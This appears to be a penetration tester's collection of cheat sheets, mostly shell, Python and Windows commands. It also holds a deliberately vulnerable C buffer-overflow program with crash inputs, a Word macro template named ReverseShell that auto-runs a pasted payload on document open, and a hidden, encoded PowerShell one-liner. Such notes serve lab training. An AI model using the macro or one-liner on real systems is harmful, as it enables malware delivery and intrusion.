<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/#table-of-contents">Top of Page</a> |
  <a href="/CheatSheets/metawork_bash.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets
## Table of Contents
* [Create a Command Alias](#create-a-command-alias)
* [Rename Multiple Files](#rename-multiple-files)
* [Invoke Another Shell](#invoke-another-shell)
* [Send Multiple Files via SSH](#send-multiple-files-via-ssh)
* [Download Multiple Files Using Wget](#download-multiple-files-using-wget)
* [Keyboard Shortcuts](#keyboard-shortcuts)

## Create a Command Alias
**Interactive Shells** (the CLI, a.k.a terminal)  
Zsh
```bash
echo "alias cls='cls'" >> .zshrc # just me
echo "alias cls='cls'" >> /etc/zsh/zshrc # for all users
```
BASH
```bash
echo "alias cls='cls'" >> .bash_aliases # just me
echo "alias cls='cls'" >> /etc/bash.bashrc # for all users
```

**Login Shells (the GUI)**
```bash
echo "alias cls='cls'" >> .profile # just me
echo "alias cls='cls'" >> /etc/profile # for all users
```

## Environment Variables
**PS1**
```bash
# how to change it to the previously less flashy one
vim .bashrc
# search for PS1 using /PS1
# comment-out PS1=$prompt_color...
# un-comment the line beneath BackTrack red prompt
```

**Shell**
```nash
# how to change it from Zsh to BASH
chsh -s /bin/bash
sudo reboot now
```

## Rename Multiple Files
```bash
for FILE in *alpha*; do mv $FILE "${FILE/alpha/beta}"; done
```

## Invoke Another Shell
This example allows you to invoke another shell Without opening another terminal (ex: after updating your .bashrc/.zshrc files).
```bash
exec "$SHELL"
```

## Send Multiple Files via SSH
```bash
scp -r software/ victor@$TARGET:~/
```

## Download Multiple Files Using Wget
```bash
wget -r http://$TARGET/$FOLDER -O $FOLDER
```

## Keyboard Shortcuts
```bash
CTRL+E # jump to end of line
CTRL+A # jump to beginning of line
CTRL+X+DEL # delete all text typed, from right to left
```

# Cheatsheet - Buffer Overflows (BOF)
## Compiling Vulnerable C Code
How to Invoke the Vim Text-Editor
```bash
vim bof.c
```

Vulnerable C Code
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char BUFFER[64];

    if (argc <2) {
        printf("[x] Error: You must provide at least one argument.\n");
        return 1; 
    }
    
    strcpy(BUFFER, argv[1]);
    printf(BUFFER);
    printf("\n");
}
```

How to Compile the Code Above
```
gcc bof.c -o bof
```

How to Run the Resulting, Compiled Program (Example 1)
```bash
./bof hello

# output
hello
```

How to Run the Resulting, Compiled Program (Example 2)
```bash
./bof $(printf 'A%.0s' {1..64})

# output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

How to Crash the Resulting, Compiled Program
```bash
./bof $(printf 'A%.0s' {1..72})

# output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

## Screenshots
* PrtSc – Save a screenshot of the entire screen to the “Pictures” directory.
* Shift + PrtSc – Save a screenshot of a specific region to Pictures.
* Alt + PrtSc  – Save a screenshot of the current window to Pictures.
* Ctrl + PrtSc – Copy the screenshot of the entire screen to the clipboard.
* Shift + Ctrl + PrtSc – Copy the screenshot of a specific region to the clipboard.
* Ctrl + Alt + PrtSc – Copy the screenshot of the current window to the clipboard.

# Cheatsheets - Macros
## Table of Contents
* [How to Add a Macro to a Microsoft Word Document](#how-to-add-a-macro-to-a-microsoft-word-document)
* [Example Macro](#example-macro)
* [Example Macro Syntax Explained](#example-macro-syntax-explained)
* [VBScript, CScript, and WScript](#vbscript-cscript-and-wscript)

## How to Add a Macro to a Microsoft Word Document
1. Click-on "View" > "Macros" 
2. Set "Macro name" to be "Reverse Shell"
3. Set "Macros in" to be the name of the current Word document
4. Click-on "Create"
5. Replace the provided template code with your payload (see below for an example)
6. Save the macro-embedded file as a "Word 97-2003 Document"

## Example Macro
To test the example code below, save it with a .doc or .docm file (do not use .docx). Ensure to use variables to store strings as VBA limits string lengths to no more than 255 per string. In other words, if you have a long payload, break it up and then concatenate each part to a variable. 
```vba
Sub AutoOpen()
  ReverseShell
End Sub

Sub Document_Open()
  RevereShell
End Sub

Sub ReverseShell()
  ' copy/paste your payload into the FOO variable
  Dim FOO As String
  FOO = ""
  
  CreateObject("Wscript.shell").Run FOO
End Sub
```

## Example Macro Syntax Explained
```bash
# Sub = used like a function, does not return values (functions do)
# AutoOpen() = predefined procedure; executed when a new doc is opened
# Document_Open() = predefined procedure; exec when a doc is already opened
# ' = comments
# Dim = used to declare a var (example declares FOO as a string var)
# CreateObject() = ???
# End Sub = represents the end of "sub" procedure within our exploit
```

## VBScript, CScript, and WScript
* 'cscript' runs entirely in the command line and is ideal for non-interactive scripts.
* 'wscript' will popup Windows dialogue boxes for user interaction.

# Obsidian
## Table of Contents
* [Installing Obsidian on Kali](#installing-obsidian-on-kali)

## Installing Obsidian on Kali
```bash
sudo apt install snapd
sudo systemctl enable --now snapd apparmor
wget https://github.com/obsidianmd/obsidian-releases/releases/download/v0.12.5/obsidian_0.12.5_amd64.snap
sudo snap install --dangerous obsidian_0.12.5_amd64.snap
```

# Cheatsheets - OpenVPN

## Configuring a Password File
```bash
echo "victor" >> creds.txt
echo "SuperStrongPassPhrase" >> creds.txt

chmod u+r creds.txt
chmod go-rwx creds.txt

sed -i '15 i\auth-user-pass creds.txt' pwk-labs.ovpn # insert this line before the 15th line
sudo openvpn pwk-labs.ovpn
```

# Cheatsheets - PowerShell

## One-Liner Syntax
```bash
powershell.exe -nop -w hidden -e abcdcef...

# -nop = No Profile (do not load the user's PowerShell profile)
# -w hidden = WindowsStyle is Hidden (do not open a window during exec)
# -e = Encoded Command (execute the following Base64 string as a command)
```

# Cheatsheets - Python
* [Pyenv](#pyenv)
* [Pip](#pip)
* [Splitting a Long String](#splitting-a-long-string)

## Pyenv
```bash
sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl*
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init --path)"' >> ~/.bashrc
echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc
exec "$SHELL"
pyenv install 3.9.5
pyenv install 2.7.18
pyenv global 2.7.18
```

## Pip
```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python get-pip.py
python -m pip --version
python -m pip install --upgrade setuptools
python -m pip install pysmb
python -m pip install pycryptodome
```

## Splitting a Long String
```python
long_string = "<long string goes here>"
chunk_size = 25
for i in range(0, len(long_string), chunk_size):
    print("long_string = long_string + " + '"' + str[i:i+chunk_size] + '"')
```

# Cheatsheets - Web Server One-Liners
```bash
busybox httpd -f -p 5050

php -S 0.0.0.0:5050

python -m SimpleHttpServer 5050

python3 -m http.server 5050

ruby -run -e httpd . -p 5050
```

# Cheatsheets - Windows Command Shell
Search the entire filesystem for a file. 
```bash
dir "\network-secret.txt" /s
```

Get the kernel version.
```bash
systeminfo | findstr Build

# output
OS Version:                10.0.17763 N/A Build 17763
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/metawork_windows_command_shell.md">Top of Page</a> |
  <a href="/CheatSheets/metawork_windows_command_shell.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
